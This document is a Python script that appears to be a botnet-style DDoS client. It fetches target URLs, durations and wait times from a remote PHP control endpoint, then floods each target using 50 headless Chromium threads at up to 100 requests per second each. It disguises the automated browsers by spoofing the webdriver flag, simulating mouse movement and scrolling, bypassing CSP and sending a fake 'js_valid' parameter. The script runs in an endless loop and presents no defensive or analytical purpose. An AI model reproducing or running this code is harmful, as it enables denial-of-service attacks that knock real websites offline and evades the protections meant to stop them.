#!/usr/bin/env python3
from playwright.sync_api import sync_playwright
import time, random, threading, urllib.parse, signal, sys, xml.etree.ElementTree as ET
import urllib.request
from concurrent.futures import ThreadPoolExecutor

API_URL = "https://labaidgroup.com/files/google_security2025992852991526.php"
THREADS = 50
RPS_PER_THREAD = 100.0
RETRY_DELAY = 5

class Stats:
    def __init__(self): self.t = self.e = 0; self.c = {}; self.l = threading.Lock()
    def add(self, code):
        with self.l:
            self.t += 1
            if code not in [200, 301, 302]: self.e += 1
            self.c[code] = self.c.get(code, 0) + 1
    def get(self): 
        with self.l: return self.t, self.e, dict(self.c)

def signal_handler(signum, frame):
    raise KeyboardInterrupt

def fetch_config():
    while True:
        try:
            req = urllib.request.Request(
                API_URL,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': '*/*',
                    'Connection': 'close'
                }
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                raw = resp.read().decode('utf-8', errors='ignore').strip()
            
            if not raw or '<data>' not in raw:
                time.sleep(RETRY_DELAY)
                continue

            root = ET.fromstring(raw)
            url_elem = root.find('url')
            time_elem = root.find('time')
            wait_elem = root.find('wait')

            if url_elem is None or time_elem is None:
                time.sleep(RETRY_DELAY)
                continue

            url = url_elem.text.strip() if url_elem.text else ""
            if not url.startswith("http"):
                url = "https://" + url
            dur = int(time_elem.text.strip())
            wait = int(wait_elem.text.strip()) if wait_elem and wait_elem.text else 0

            return url, dur, wait

        except Exception:
            time.sleep(RETRY_DELAY)

def worker(tid, url, dur, stats, stop, last, target_rps):
    browser = None
    page = None
    try:
        start = time.time()
        interval = 1.0 / target_rps
        next_time = start
        mouse_moves = 0
        scroll_amount = 0

        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                    "--disable-images", "--disable-extensions", "--single-process",
                    "--disable-background-timer-throttling", "--disable-renderer-backgrounding",
                    "--disable-backgrounding-occluded-windows", "--no-default-browser-check"
                ]
            )
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
                viewport={'width': 360, 'height': 640},
                java_script_enabled=True,
                bypass_csp=True,
                ignore_https_errors=True
            )
            context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                window.chrome = { runtime: {} };
            """)
            page = context.new_page()

            while time.time() - start < dur and not stop.is_set():
                now = time.time()
                if now < next_time:
                    time.sleep(min(0.01, next_time - now))
                    continue

                try:
                    for _ in range(3):
                        x = random.randint(50, 300)
                        y = random.randint(50, 500)
                        page.mouse.move(x, y)
                        mouse_moves += 1
                    page.evaluate("window.scrollBy(0, 300)")
                    scroll_amount += 300

                    resp = page.goto(url, wait_until="domcontentloaded", timeout=8000)
                    code = resp.status if resp else 0

                    params = urllib.parse.urlencode({
                        'update': '1', 'js_valid': 'true',
                        'mouse': mouse_moves, 'scroll': int(scroll_amount)
                    })
                    try:
                        page.goto(f"{url}?{params}", wait_until="commit", timeout=3000)
                    except: pass

                    stats.add(code)
                    last[0] = str(code)
                except:
                    code = 0
                    stats.add(code)
                    last[0] = str(code)

                next_time += interval
                if time.time() > next_time + 0.5:
                    next_time = time.time() + interval

    except Exception:
        pass
    finally:
        try:
            if page: page.close()
            if browser: browser.close()
        except: pass

def run_attack(url, dur, wait_time):
    time.sleep(wait_time)

    stats = Stats()
    stop = threading.Event()
    last = ["---"]
    st = time.time()

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(worker, i, url, dur, stats, stop, last, RPS_PER_THREAD) for i in range(THREADS)]

        try:
            while any(f.running() for f in futures) and time.time() - st < dur:
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop.set()
            time.sleep(1)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    while True:
        url, dur, wait_time = fetch_config()
        run_attack(url, dur, wait_time)

if __name__ == "__main__":
    main()
